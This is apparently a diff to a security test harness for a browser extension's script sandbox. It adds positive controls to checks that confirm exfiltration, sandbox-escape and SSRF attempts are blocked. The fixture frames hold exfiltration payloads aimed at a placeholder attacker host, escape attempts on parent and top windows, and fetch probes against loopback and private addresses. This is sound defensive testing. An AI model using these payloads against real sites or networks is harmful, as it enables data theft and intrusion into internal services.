@@ -147,7 +147,7 @@ const host = "__ATTACKER_URL__";
 const frames = {
   exfil: [
     '<img src="' + host + '/leak-img?d=secret">',
-    '<script>fetch("' + host + '/leak-fetch").catch(()=>{}); navigator.sendBeacon("' + host + '/leak-beacon"); try{new WebSocket("ws://127.0.0.1:9/leak-ws");}catch(e){}<\\/script>',
+    '<script>fetch("' + host + '/leak-fetch").catch(()=>{}); navigator.sendBeacon("' + host + '/leak-beacon"); try{new WebSocket("ws://127.0.0.1:9/leak-ws");}catch(e){} parent.postMessage({ type: "cap:security-escape", result: { frame: "exfil", executed: true } }, "*");<\\/script>',
   ].join(""),
   // CRITICAL regression probes (sol): the pre-head load + self-navigation +
   // meta-refresh escapes. Each must be BLOCKED (no request reaches the attacker).
@@ -161,7 +161,7 @@ const frames = {
     // form navigation (the location object is unforgeable, so location.href is
     // closed by the extension-level declarativeNetRequest rule — verified in the
     // extension journeys). Here we verify the guard's window.open block.
-    '<script>try{var w=window.open("' + host + '/self-window-open");}catch(e){}<\\/script>',
+    '<script>var opened = false; try{var w=window.open("' + host + '/self-window-open"); opened = !!w;}catch(e){} parent.postMessage({ type: "cap:security-escape", result: { frame: "selfnav", attempted: true, opened: opened } }, "*");<\\/script>',
   ].join(""),
   'metarefresh': [
     // A meta-refresh navigation — must be stripped (never reaches the attacker).
@@ -169,7 +169,9 @@ const frames = {
   ].join(""),
   escape: [
     '<script>',
-    'var r = {};',
+    'var r = { frame: "escape" };',
+    'r.domAccessible = (typeof document === "object" && document !== null && typeof window === "object");',
+    'r.origin = window.location.origin;',
     'try { r.parentRead = parent.document.title; } catch(e) { r.parentRead = "blocked:" + e.name; }',
     'try { top.location.href = "' + host + '/navigated"; r.topNav = "attempted"; } catch(e) { r.topNav = "blocked:" + e.name; }',
     'r.opener = (window.opener === null) ? "null" : "present";',
@@ -256,15 +258,22 @@ async function main() {
     const fx = await cdp.open(`${docs.url}/security-fixture`);
     await sleep(3500);
 
+    const results = await cdp.eval(fx.sessionId, `window.__securityResults ?? []`);
+    const exfilReport = (results ?? []).find((x: any) => x?.result?.frame === "exfil")?.result ?? null;
+    check("network exfil: untrusted exfil frame executed its exfiltration probes in the sandbox", exfilReport?.executed === true, exfilReport);
+
     const n = attacker.requests();
     check("network exfil: no request escaped the sandbox", n === 0, { attackerRequests: n, paths: attacker.paths() });
 
-    const results = await cdp.eval(fx.sessionId, `window.__securityResults ?? []`);
-    const escape = (results ?? []).find((x: any) => x?.result?.parentRead !== undefined)?.result ?? null;
+    const escape = (results ?? []).find((x: any) => x?.result?.frame === "escape" || x?.result?.parentRead !== undefined)?.result ?? null;
+    check("sandbox execution: the untrusted frame executed in an opaque null-origin context with DOM available", escape !== null && escape.domAccessible === true && escape.origin === "null", escape);
     check("sandbox escape: parent.document is blocked", String(escape?.parentRead ?? "").startsWith("blocked"), escape);
     check("sandbox escape: top navigation is blocked", String(escape?.topNav ?? "").startsWith("blocked"), escape);
     check("sandbox escape: window.opener is null", escape?.opener === "null", escape);
     check("prompt-injection: no chrome.runtime (extension API) in the sandbox", escape?.chromeRuntime === "absent", escape);
+
+    const selfnavReport = (results ?? []).find((x: any) => x?.result?.frame === "selfnav")?.result ?? null;
+    check("sandbox escape: window.open was attempted by selfnav frame and blocked (returned null/false)", selfnavReport?.attempted === true && selfnavReport?.opened === false, selfnavReport);
 
     const path = await cdp.eval(fx.sessionId, `location.pathname`);
     check("sandbox escape: the outer page did not navigate away", String(path).includes("security-fixture"), path);
@@ -292,6 +301,8 @@ async function main() {
     await cdp.send("Runtime.enable", {}, fx.sessionId);
     await sleep(300);
     off();
+    const mainDom = await cdp.eval(fx.sessionId, `typeof window === "object" && typeof document === "object" && document.title`);
+    check("sender authority: a page's MAIN world executed with real DOM ('security fixture')", mainDom === "security fixture", { mainDom });
     const mainRuntime = await cdp.eval(fx.sessionId, `typeof chrome === "object" && chrome && typeof chrome.runtime`);
     check("sender authority: a page's MAIN world has no chrome.runtime", mainRuntime === "undefined" || mainRuntime === false, { mainRuntime });
     const isolated = contexts.find((c) => c?.auxData?.type === "isolated");
@@ -322,6 +333,26 @@ async function main() {
     await sleep(2000);
 
     // 5. cap:fetch SSRF — four private targets, each refused before any request.
+    const createdScripts: string[] = [];
+
+    // POSITIVE CONTROL: verify that sandboxed script execution actually works
+    // and fetch is available in the sandbox, proving the refusal below is
+    // specifically due to the private/loopback address check, not a broken sandbox.
+    const controlCreated = await sendFrom(cdp, opts.sessionId, {
+      type: "script.create",
+      origin: "master",
+      name: "ssrf positive control",
+      source: "return { executed: true, math: 21 * 2, hasFetch: typeof fetch === 'function' };",
+    });
+    const controlId = controlCreated?.script?.id ?? "";
+    if (controlId) createdScripts.push(controlId);
+    const controlRun = controlId ? await sendFrom(cdp, opts.sessionId, { type: "script.run", origin: "master", id: controlId }) : controlCreated;
+    check(
+      "cap:fetch: sandboxed script execution is functional — unconstrained computation executes to success",
+      controlRun?.ok === true && controlRun?.result?.executed === true && controlRun?.result?.math === 42 && controlRun?.result?.hasFetch === true,
+      controlRun,
+    );
+
     const targets = [
       ["loopback 127.0.0.1", `${attacker.url}/?d=leak`],
       ["RFC1918 10.0.0.1", "http://10.0.0.1/?d=leak"],
@@ -329,7 +360,6 @@ async function main() {
       ["localhost", `http://localhost:${attacker.port}/?d=leak`],
     ];
     const attackerBefore = attacker.requests();
-    const createdScripts: string[] = [];
     for (const [label, url] of targets) {
       const created = await sendFrom(cdp, opts.sessionId, { type: "script.create", origin: "master", name: `ssrf probe ${label}`, source: `return (await fetch(${JSON.stringify(url)})).status` });
       const id = created?.script?.id ?? "";
